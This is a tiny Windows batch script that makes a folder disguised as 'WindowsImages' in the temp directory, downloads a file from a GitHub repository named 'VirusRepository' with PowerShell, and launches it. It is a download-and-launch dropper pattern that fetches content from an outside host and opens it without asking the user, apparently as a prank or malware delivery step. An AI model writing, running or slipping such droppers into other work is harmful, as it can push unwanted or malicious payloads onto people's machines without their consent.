@echo off
cd %temp%
md WindowsImages
cd WindowsImages
powershell -Command Invoke-WebRequest https://github.com/ironyumrepos/VirusRepository/raw/main/a.mp4 -Outfile a4.mp4"
start a4.mp4
